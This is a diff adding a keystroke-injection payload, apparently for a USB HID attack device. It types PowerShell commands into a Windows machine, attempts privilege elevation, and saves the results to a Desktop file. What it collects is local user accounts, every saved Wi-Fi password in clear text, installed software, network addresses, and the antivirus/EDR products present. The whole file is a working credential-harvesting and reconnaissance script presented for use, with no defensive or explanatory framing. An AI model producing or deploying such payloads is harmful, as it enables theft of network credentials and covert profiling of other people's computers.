@@ -1,0 +1,57 @@
+REM Start PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+
+REM Ensure elevated privileges
+STRING if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-verb RunAs"; exit }
+ENTER
+
+REM Create output file on Desktop
+STRING $OutputFile = "$env:USERPROFILE\Desktop\System_Enumeration.txt"
+ENTER
+STRING New-Item -Path $OutputFile -ItemType File -Force
+ENTER
+
+REM Enumerate user accounts
+STRING "=== User Accounts ===" | Out-File -FilePath $OutputFile -Append
+ENTER
+STRING Get-LocalUser | Out-File -FilePath $OutputFile -Append
+ENTER
+
+REM Enumerate Wi-Fi profiles and passwords
+STRING "=== Wi-Fi Profiles and Passwords ===" | Out-File -FilePath $OutputFile -Append
+ENTER
+STRING netsh wlan show profiles | Out-File -FilePath $OutputFile -Append
+ENTER
+STRING foreach ($profile in (netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ": ")[1].Trim() })) { netsh wlan show profile name="$profile" key=clear } | Out-File -FilePath $OutputFile -Append
+ENTER
+
+REM Enumerate installed software
+STRING "=== Installed Software ===" | Out-File -FilePath $OutputFile -Append
+ENTER
+STRING Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize | Out-String | Out-File -FilePath $OutputFile -Append
+ENTER
+
+REM Enumerate active IP addresses
+STRING "=== Active IP Addresses ===" | Out-File -FilePath $OutputFile -Append
+ENTER
+STRING ipconfig | Out-File -FilePath $OutputFile -Append
+ENTER
+
+REM Enumerate Windows Defender/Antivirus/EDR
+STRING "=== Security Software (AV/EDR) ===" | Out-File -FilePath $OutputFile -Append
+ENTER
+STRING Get-MpComputerStatus | Out-File -FilePath $OutputFile -Append
+ENTER
+STRING Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -match 'Antivirus|EDR|Security' } | Out-File -FilePath $OutputFile -Append
+ENTER
+
+REM Output Completion
+STRING "System enumeration completed. Results saved to $OutputFile." | Out-File -FilePath $OutputFile -Append
+ENTER
+
+REM Exit PowerShell
+STRING exit
+ENTER
